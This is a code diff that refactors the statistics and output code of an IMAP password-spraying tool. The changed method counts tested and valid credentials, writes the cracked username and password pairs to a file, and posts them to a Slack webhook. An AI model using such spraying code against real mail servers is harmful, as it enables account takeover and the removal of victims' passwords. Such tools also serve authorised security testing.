@@ -45,7 +45,7 @@ class IMAPSprayer:
     
     def spray(self, *, userlist: List[str],
                 passwordlist: List[str],
-                sleep: int, jitter: int, lockout: int, outputfile: str,
+                sleep: int, jitter: int, lockout: int,
                 randomize: bool = False, slack: str = None):     
         self.creds = {}
         self.invalid = 0
@@ -151,23 +151,23 @@ class IMAPSprayer:
     # ==========
     # Statistics
     # ==========
-    def spray_stats(self, creds, invalid, args):
+    def spray_stats(self, output: str = 'valid_creds.txt', slack: str = None):
         stats_text = "\n%s\n[*] Password Spraying Stats\n%s\n" % ("=" * 27, "=" * 27)
-        stats_text += "[*] Total Usernames Tested:  %d\n" % (
-            len(creds) + invalid
+        stats_text += "[*] Total Credentials Tested:  %d\n" % (
+            len(self.creds) + self.invalid
         )
-        stats_text += "[*] Valid Accounts:          %d\n" % len(creds)
-        stats_text += "[*] Invalid Usernames:       %d\n" % invalid
+        stats_text += "[*] Valid Accounts:            %d\n" % len(self.creds)
+        stats_text += "[*] Invalid Credentials:       %d\n" % self.invalid
         print(stats_text)
-        if len(creds) > 0:
-            print(f"[+] Writing valid credentials to the file: {args.output}...")
-            with open(args.output, "w") as file_:
-                for user in creds.keys():
-                    file_.write("%s\n" % ("%s:%s" % (user, creds[user])))
+        if len(self.creds) > 0:
+            print(f"[+] Writing valid credentials to the file: {output}...")
+            with open(output, "w") as file_:
+                for user in self.creds.keys():
+                    file_.write("%s\n" % ("%s:%s\t(%s)" % (user, self.creds[user]["password"], self.creds[user]["message"])))
                     # Append to text
-                    stats_text += "\n%s:%s" % (user, creds[user])
-        if args.slack:
-            webhook = SlackWebhook(args.slack)
+                    stats_text += "\n%s:%s" % (user, self.creds[user])
+        if slack:
+            webhook = SlackWebhook(slack)
             try:
                 webhook.post(stats_text)
             except BaseException as e:
